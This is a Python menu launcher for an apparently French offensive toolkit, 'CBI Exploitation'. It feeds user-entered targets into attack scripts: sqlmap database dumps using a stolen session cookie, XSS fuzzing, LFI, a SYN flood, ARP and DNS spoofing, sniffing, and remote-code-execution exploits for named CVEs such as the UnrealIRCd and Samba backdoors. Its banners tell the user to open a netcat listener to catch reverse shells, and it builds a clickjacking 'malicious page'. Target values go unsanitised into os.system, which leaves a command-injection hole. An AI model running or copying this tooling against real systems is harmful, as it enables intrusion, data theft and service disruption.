# !/usr/bin/python3
import json
import os
import webbrowser
from Intelligence_gathering import red, white
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)
os.system("clear")
#os.system("figlet CBI Exploitation")
def print_menu():
    print("\n\n\n")
    print("\t\t\t*************************************************************************")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.YELLOW + "                [ Exploitation Menu ]"+"\t\t\t\t*")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*************************************************************************")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"1. Exploitation des vulnérabilités des applications Web"+"\t\t*")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"2. Exploitation des vulnérabilités réseau"+"\t\t\t*")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.RED  +"3. Quitter "+"\t\t\t\t\t\t\t*")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*************************************************************************")
    # print("\t\t\t*\t\t\t\t\t\t*")
    print("\n\n\n")
    print()
def menu():
    while True:
        print_menu()
        choice = input(Fore.YELLOW + "Entrez votre choix (1, 2 ou 3) : ")
        if choice == "1":
            web_app_vulnerability_Exploiting()
        elif choice == "2":
            network_vulnerability_Exploiting()
        elif choice == "3":
            print(Fore.YELLOW + "Au revoir !")
            break
        else:
            print(Fore.RED + "Choix invalide. Veuillez choisir 1, 2 ou 3.")
def printweb():
    os.system("clear")
    print("\n\n\n")
    print("\t\t\t*************************************************************************")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.GREEN + "[ Exploitation des vulnérabilités des applications Web ] "+"\t*")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*************************************************************************")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.YELLOW +"[ Menu ]"+"\t\t\t\t\t\t\t*")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"1. LFI exploitation"+"\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"2. clickjacking"+"\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"3. SQLi"+"\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"4. XSS"+"\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"5. Backup Files"+"\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.RED  +"0. Quitter "+"\t\t\t\t\t\t\t*")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*************************************************************************")
    print("\n\n\n")
def web_app_vulnerability_Exploiting():
    while True:
        printweb()
        choice = int(input(Fore.YELLOW + "Enter your choice  : "))
        print("")
        # url = input("Entrez l'URL de la cible : ")
        if choice == 1:
            url = input(Fore.YELLOW +"Enter the URL of the target : ")
            path = input(Fore.YELLOW +"Enter the file path to explore : ")
            os.system(f"python3 lfiexploit.py {url} {path}")
            input("\n\033[93m Enter To Exit")
        elif choice == 2:
            # url = input("Enter the URL of the target: ")
            clickjacking()
        elif choice == 3:
            os.system("clear")
            print("\n\n\n")
            print("\t\t\t*************************************************************************")
            print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
            print("\t\t\t*\t"+Fore.YELLOW +"                       [ Menu ]"+"\t\t\t\t\t*")
            print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
            print("\t\t\t*************************************************************************")
            print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
            print("\t\t\t*\t"+Fore.CYAN +"1. Database Enumeration via SQL Injection"+"\t\t\t*")
            print("\t\t\t*\t"+Fore.CYAN +"2. Database Columns Enumeration via SQL Injection"+"\t\t*")
            print("\t\t\t*\t"+Fore.CYAN +"3. Data Extraction via SQL Injection"+"\t\t\t\t*")
            print("\t\t\t*\t"+Fore.RED  +"0. Quitter " + "\t\t\t\t\t\t\t*")
            print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
            print("\t\t\t*************************************************************************")
            print("\n\n\n")
            choice = int(input(Fore.YELLOW +"Enter your choice  : "))
            print("")
            if choice == 1:
                url = input(Fore.YELLOW +"Enter the URL of the target  : ")
                session_cookie = input(Fore.YELLOW +"Enter the session cookie  : ")
                os.system(f'python3 sqlmap/sqlmap.py -u "{url}" --cookie="{session_cookie}" --dbs')
                input(Fore.RED +"Enter to exit !")
            elif choice == 2:
                url = input(Fore.YELLOW +"Enter the URL of the target  : ")
                session_cookie = input(Fore.YELLOW +"Enter the session cookie : ")
                os.system(f'python3 sqlmap/sqlmap.py -u "{url}" --cookie="{session_cookie}" --columns')
                input(Fore.RED +"Enter to exit !")
            elif choice == 3:
                url = input(Fore.YELLOW +"Enter the URL of the target  : ")
                session_cookie = input(Fore.YELLOW +"Enter the session cookie : ")
                os.system(f'python3 sqlmap/sqlmap.py -u "{url}" --cookie="{session_cookie}" --dump')
                input(Fore.RED +"Enter to exit !")
            elif choice == 0:
                print(Fore.YELLOW + "Au revoir !")
                break
            else:
                print(Fore.RED + "Choix invalide.")
        elif choice == 4:
            url = input(Fore.CYAN +"Enter the URL of the target : ")
            file = input(Fore.CYAN +"Enter the  XSS payloads wordlist : ")
            parameter = input(Fore.CYAN +"Enter the  Parameter to test : ")
            print('\n')
            os.system(f"python3 xss_attack.py -u {url} -x {file} -p {parameter} ")
            input("\nEnter to exit!")
        elif choice == 5:
            url = input(Fore.YELLOW +"Enter the URL of the target : ")
            file = input(Fore.YELLOW +"Enter The comma-separated list of files you want to search for (e.p index.php,config.php): ")
            os.system(f"python3 BuckupFile.py -u {url} -f {file}")
        elif choice == 0:
            print(Fore.YELLOW + "Au revoir !")
            break
        else:
            print(Fore.RED + "Choix invalide.")

def printnetwork():
    os.system("clear")
    #os.system("figlet CBI Exploiting network Vulnerabilities")
    print("\n\n\n")
    print("\t\t\t*************************************************************************")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.GREEN + " [ Exploitation des vulnérabilités réseau ] "+"\t\t\t*")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*************************************************************************")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.YELLOW +"[ Menu ]"+"\t\t\t\t\t\t\t*")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"1.  FTP FreeBSD 9.1 (CVE-2011-2523)"+"\t\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"2.  SYN flood (CVE-2010-4478)"+"\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"3.  ARP spoofing"+"\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"4.  packet sniffing"+"\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"5.  DNS spoofing"+"\t\t\t\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"6.  Remote Command Execution (CVE-2014-6287)"+"\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"7.  Remote Command Execution (CVE-2010-2075)"+"\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"8.  Remote Command Execution (CVE-2007-2447)"+"\t\t\t*")
    print("\t\t\t*\t"+Fore.CYAN +"9.  OpenSSH User Enumeration Vulnerability (CVE-2016-6210)"+"\t*")
    print("\t\t\t*\t"+Fore.CYAN +"10. OpenSSH 4.7p1 (CVE-2008-5161)"+"\t\t\t\t*")
    print("\t\t\t*\t"+Fore.RED  +"0. Quitter "+"\t\t\t\t\t\t\t*")
    print("\t\t\t*\t\t\t\t\t\t\t\t\t*")
    print("\t\t\t*************************************************************************")
    # print("\t\t\t*\t\t\t\t\t\t*")
    print("\n\n\n")
def network_vulnerability_Exploiting():
    while True:
        printnetwork()
        choice = int(input(Fore.YELLOW +"Enter your choice  : "))
        print("")
        # url = input("Entrez l'URL de la cible : ")
        if choice == 1:
            url = input(Fore.CYAN +"Entrez l'IP de la cible : ")
            print('\n')
            os.system(f"python3 CVE-2011-2523.py -host {url}")
            input(Fore.RED+'\nEnter to exit!')
        elif choice == 2:
            url = input(Fore.YELLOW +"Entrez l'IP de la cible : ")
            port = input(Fore.YELLOW +"Entrez le numéro de port cible : ")
            paquet = input(Fore.YELLOW +"Entrez le nombre de paquets : ")
            os.system(f"sudo python3 syn_flood.py --target {url} --port {port} --count {paquet}")
            input(Fore.RED+'\nEnter to exit!')
        elif choice == 3:
            url = input(Fore.YELLOW +"Entrez l'IP de la cible : ")
            gateway = input(Fore.YELLOW +"Entrez le gateway : ")
            os.system(f"sudo python3 arp_sppofer.py --target {url} --gateway {gateway} ")
            input(Fore.RED+'\nEnter to exit!')
        elif choice == 4:
            url = input(Fore.YELLOW +"Entrez l'IP de la cible : ")
            interface = input(Fore.YELLOW +"Entrez l'interface : ")
            os.system(f"sudo python3 packet_sniffer.py --interface {interface} --target {url} ")
            input(Fore.RED+'\nEnter to exit!')
        elif choice == 5:
            url = input(Fore.YELLOW +"Entrez l'URL de la cible : ")
            redirect = input(Fore.YELLOW +"Entrez l'IP de la redirection : ")
            os.system(f"sudo python3 dns_spoof.py --url {url} --redirect {redirect} ")
            input(Fore.RED+'\nEnter to exit!')
        elif choice == 6:
            command = f"python3 HFS-RCE.py"
            os.system(command)
            input(Fore.RED+'\nEnter to exit!')
        elif choice == 7:
            banner = """
                 _   _                      _      ___ ____    ____     _____  ____    ___   _ 
                | | | |_ __  _ __ ___  __ _| |    |_ _|  _ \  / ___|   |___ / |___ \  ( _ ) / |
                | | | | '_ \| '__/ _ \/ _` | |_____| || |_) || |   _____ |_ \   __) | / _ \ | |
                | |_| | | | | | |  __/ (_| | |_____| ||  _ <|| |__|_____|__) | / __/ | (_) || |
                 \___/|_| |_|_|  \___|\__,_|_|    |___|_| \_\ \____|   |____(_)_____(_)___(_)_|
                ================================================================================                                                                       
                [*] Unreal IRC Backdoor Remote command Execution (3.2.8.1)
                [*] CVE : 2010-2075
                [*] by  : CBI
                ================================================================================
                [*] start a netcat listener on the local port 
        	             ==> nc -lvp <port> .... eg : nc -lvnp 4444
                ================================================================================
                """
            print(banner)
            remote_host = input(Fore.YELLOW +"Entrez l'adresse IP de la cible : ")
            remote_port = int(input(Fore.YELLOW +"Entrez target port (6667) : "))
            payload_type = input(Fore.YELLOW +"Entrez le type de payload (python/netcat/bash) : ")

            command = f"python3 unreal_irc_rce.py -payload {payload_type} {remote_host} {remote_port}"

            os.system(command)
            input(Fore.RED+'\nEnter to exit!')
        elif choice == 8:
            banner = '''


                                 _                                                       
                                | |                                                      
             ___  __ _ _ __ ___ | |__   __ _   _   _ ___  ___ _ __ _ __ ___   __ _ _ __  
            / __|/ _` | '_ ` _ \| '_ \ / _` | | | | / __|/ _ \ '__| '_ ` _ \ / _` | '_ \ 
            \__ \ (_| | | | | | | |_) | (_| | | |_| \__ \  __/ |  | | | | | | (_| | |_) |
            |___/\__,_|_| |_| |_|_.__/ \__,_|  \__,_|___/\___|_|  |_| |_| |_|\__,_| .__/ 
                                                                                  | |    
                                                                                  |_|
                                                                            @CBI 
            ================================================================================
            [*] start a netcat listener on the local port 
                ==> nc -lvp <port> .... eg : nc -lvnp 4444
            ================================================================================ 

                                                                       '''
            print(banner)
            target = input(Fore.YELLOW + "Entrez l'adresse IP de la cible : ")
            port = input(Fore.YELLOW + "Entrez le port cible (139 ou 445) : ")
            lhost = input(Fore.YELLOW + "Entrez L'adresse de l'auditeur : ")
            lport = input(Fore.YELLOW + "Entrez Le port d'écoute : ")
            os.system(f"python3 CVE-2007-2447.py  {target}  {port}  {lhost} {lport}")
            input(Fore.RED + '\nEnter to exit!')
        elif choice == 9:
            username_list = input(Fore.CYAN +"Entrez le nom du fichier de la liste des noms d'utilisateur : ")
            target = input(Fore.CYAN +"Entrez l'adresse IP de la cible : ")
            outfile = input(Fore.CYAN +"Entrez le nom du fichier de sortie : ")
            print('\n')
            os.system(f"python3 CVE-2016-6210.py {username_list} {target} {outfile}")
            input(Fore.RED + '\nEnter to exit!')
        elif choice == 10:
            os.system(f"python3 OpenSSH_4_7_p1.py")
            input(Fore.RED + '\nEnter to exit!')
        elif choice == 0:
            print(Fore.YELLOW + "Au revoir !")
            break
        else:
            print(Fore.RED + "Choix invalide.")
def clickjacking():
    def exploit_clickjacking(target_url):
        # Créer le code HTML pour la page malveillante
        html_code = '''
           <html>
               <head>
                   <title>Page Malveillante</title>
               </head>

               <body>
                   <h1>Page Malveillante</h1>
                   <h2>Cliquez ici pour réclamer votre prix!</h2>
                   <iframe width="900" height="600" src="%s"></iframe>
               </body>
           </html>
           ''' % target_url

        # Enregistrer le code HTML dans un fichier
        with open('malicious_page.html', 'w') as f:
            f.write(html_code)

        # Ouvrir la page malveillante dans un navigateur Web
        maliciousPage = 'file://' + os.path.abspath('malicious_page.html')
        webbrowser.open(maliciousPage)
        result = {'vulnerability': 'clickjacking', 'target_url': target_url, 'malicious page': maliciousPage}
        file_path = 'report/exploit.json'
        print('\n[+] Exploitation de la vulnérabilité de clickjacking!')
        if os.path.exists(file_path):
            with open(file_path, 'r') as f:
                data = json.load(f)
            data.append(result)
        else:
            data = [result]

        with open(file_path, 'w') as f:
            json.dump(data, f, indent=4)

        print("Résultat sauvegardé dans 'report/exploit.json'.")
        input(Fore.RED +"Enter to exit!")

    # Exemple d'utilisation du script
    target_url = input("Entrez l'URL de la page cible: ")
    exploit_clickjacking(target_url)

if __name__ == '__main__':
    ulang = ''
    while ulang != 'n':
        menu()
        ulang = input("\n{}Back?(y/n) :{}".format(red,white))
        os.system('clear')
